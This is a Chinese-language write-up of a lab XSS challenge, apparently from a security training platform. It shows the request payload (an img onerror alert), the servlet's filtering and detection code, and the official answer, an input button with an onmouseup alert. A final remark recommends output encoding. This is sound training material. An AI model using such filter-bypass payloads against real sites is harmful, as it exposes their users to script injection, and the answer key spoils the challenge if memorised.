# Cross Site Scripting Two(跨站脚本攻击 2)
 
## 题介绍
一个XSS攻击点，需要提交一个绕过检查的攻击语句 

## 功能实现 

请求数据包  
```
POST /challenges/t27357536888e807ff0f0eff751d6034bafe48954575c3a6563cb47a85b1e888 HTTP/1.1

searchTerm=%3Cimg+src%3D%23+onerror%3Dalert(1)+%3E&csrfToken=22792033228396859635296159069930202705

```
对应实现代码 src/main/java/servlets/module/challenge/XssChallengeTwo.java

```
String searchTerm = request.getParameter("searchTerm");
log.debug("User Submitted - " + searchTerm);
searchTerm = XssFilter.levelTwo(searchTerm);
log.debug("After Filtering - " + searchTerm);
String htmlOutput = new String();
if(FindXSS.search(searchTerm))  //调用过滤函数进行过滤 
{
	htmlOutput = "<h2 class='title'>" + bundle.getString("result.wellDone") + "</h2>" +
			"<p>" + bundle.getString("result.youDidIt") + "<br />" +
			bundle.getString("result.resultKey") + " <a>" +
				Hash.generateUserSolution(
						Getter.getModuleResultFromHash(getServletContext().getRealPath(""), levelHash
						), (String)ses.getAttribute("userName")
				)
			 +
			"</a>";
	log.debug(levelName + " completed");
}

public static boolean FindXSS.search (String xssString)
	{
		boolean xssDetected = false;
		log.debug("String to Search: " + xssString);
		
		//Need to tidy submitted string, similar to how a browser would when it interprets it
		Tidy tidy = new Tidy();
		tidy.setXHTML(true);  //进行过滤
		tidy.setQuiet(true);
		tidy.setShowWarnings(false);
		InputStream inputStream = new ByteArrayInputStream(xssString.getBytes());
		ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
		tidy.parseDOM(inputStream, outputStream);
		String tidyHtml = outputStream.toString().toLowerCase();
		try
		{
			outputStream.close();
			inputStream.close();
		}
		catch(Exception e)
		{
			log.error("Could not Cloud Tidy Input/Output Streams: " + e.toString());
		}
		
		
```
如果经过过滤的数据里面仍然存在可以正常执行的alert就认为成功 

## 解题步骤  

官方给的答案  
```
<input type="button" onmouseup="alert('XSS')"/>
```

## 总结  

试图针对XSS攻击的过滤时非常难的，非富文本的情况，尽可能进行编码输出 ，或使用公认的安全库进行操作  